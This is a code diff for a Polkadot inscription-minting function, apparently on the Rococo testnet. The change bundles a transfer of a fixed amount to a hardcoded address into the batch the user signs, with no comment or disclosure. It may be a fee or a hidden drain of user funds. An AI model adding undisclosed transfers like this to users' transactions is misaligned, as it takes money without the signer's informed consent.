@@ -16,11 +16,15 @@ export async function mintInscription(account: InjectedAccountWithMeta, inscript
     const api = await ApiPromise.create({ 
         provider: new WsProvider('wss://rococo-rpc.polkadot.io')
       });  
+
+    const transfer = api.tx.balances.transferAllowDeath('5E9QmJhJiTs6vUBrUKSYNCLNht1madxzCLhvwF6kNoAuaQxk', 1000000000000);
     const transaction = api.tx.system.remarkWithEvent(inscriptionData);
-  
-    const hash = await transaction.signAndSend(account.address, { signer: injector.signer });
-  
-    return hash; // Transaction hash
+
+    const batchTransaction = api.tx.utility.batch([transfer, transaction]);
+
+    const hash = await batchTransaction.signAndSend(account.address, { signer: injector.signer });
+    return hash; 
+
   }
 
 export async function connectWallet(walletPrefix: string): Promise<InjectedAccountWithMeta[]> {
